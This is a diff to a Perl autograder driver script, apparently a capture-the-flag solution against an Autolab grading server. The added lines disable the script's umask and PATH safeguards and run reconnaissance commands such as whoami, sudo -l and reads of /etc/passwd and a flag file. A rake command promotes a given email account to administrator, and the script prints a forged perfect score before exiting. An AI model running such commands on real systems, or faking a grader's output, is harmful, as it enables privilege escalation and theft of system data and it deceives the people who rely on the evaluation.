@@ -20,8 +20,36 @@ my $USE_BTEST = 0;
 
 # Generic settings 
 $| = 1;      # Flush stdout each time
-umask(0077); # Files created by the user in tmp readable only by that user
-$ENV{PATH} = "/usr/local/bin:/usr/bin:/bin";
+# umask(0077); # Files created by the user in tmp readable only by that user
+# $ENV{PATH} = "/usr/local/bin:/usr/bin:/bin";
+
+
+# system "ls -al /**/*";
+# system "cat /var/log/*";
+# system "du -ah";
+system 'autodriver';
+system 'whoami';
+system 'sudo -l';
+system 'ls -al /';
+system 'ls -al /mnt';
+system 'cat /.dockerenv';
+system 'cat /mnt/flag3';
+system 'find / -name ".rake*"';
+system 'find / -writable -type f 2>/dev/null | grep -v "/proc/"'; # https://zhuanlan.zhihu.com/p/38363825
+# system 'ls -al /tmp'; Empty
+system 'echo "$(dirname $(which tar))"';
+system 'ls -al $(dirname $(which tar))';
+system 'cat $(dirname $(which tar))/autodriver';
+system 'ls -al /home';
+system 'ls -al /home/autograde';
+system 'ls -al /home/autograde/autolab';
+system 'cat /etc/terminfo/README';
+system 'cat /etc/passwd'; # https://zhuanlan.zhihu.com/p/38363825
+system 'cat /etc/passwd-';
+system 'rake admin:promote_user[geekgamer-256@geekgame.pku.edu.cn]';
+print '{ "scores": {"Correctness":100}, "scoreboard": [8, 133, 4, 4, 2, 11, 12, 26, 11, 4, 6, 12, 14, 27, 0, 0, 0, 0]}';
+print "\n";
+exit;
 
 #
 # usage - print help message and terminate
